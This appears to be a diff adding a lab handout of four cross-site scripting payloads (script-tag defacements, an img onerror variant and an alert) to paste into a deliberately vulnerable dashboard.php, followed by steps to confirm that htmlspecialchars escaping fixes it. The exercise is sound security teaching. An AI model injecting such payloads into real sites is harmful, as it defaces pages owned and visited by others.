@@ -1,0 +1,30 @@
+=====================================================================
+ DEFACEMENT XSS PAYLOADS  —  copy/paste these into the "Post" box on
+ dashboard.php WHILE it is running the VULNERABLE version.
+=====================================================================
+
+1) Simple visible defacement (replaces the whole page):
+-----------------------------------------------------------------
+<script>document.body.innerHTML = "<h1 style='color:red'>THIS SITE HAS BEEN HACKED</h1>";</script>
+
+
+2) Full-screen defacement banner (more dramatic, good for screenshots):
+-----------------------------------------------------------------
+<script>document.body.innerHTML="<div style='background:black;color:lime;font-size:40px;text-align:center;padding:100px;font-family:monospace'>HACKED BY SEAN<br>XSS DEFACEMENT DEMO</div>";</script>
+
+
+3) No-JavaScript defacement (works even if script tags are stripped):
+-----------------------------------------------------------------
+<img src=x onerror="document.body.innerHTML='<h1>DEFACED</h1>'">
+
+
+4) Pop-up proof that script executes:
+-----------------------------------------------------------------
+<script>alert('XSS by Sean - the site is vulnerable');</script>
+
+=====================================================================
+After you capture your attack screenshots, switch dashboard.php back
+to the SECURED version (the e() / htmlspecialchars lines). Paste the
+SAME payload again — it will now appear as plain text and the page is
+NOT defaced. That is your "fix works" screenshot.
+=====================================================================
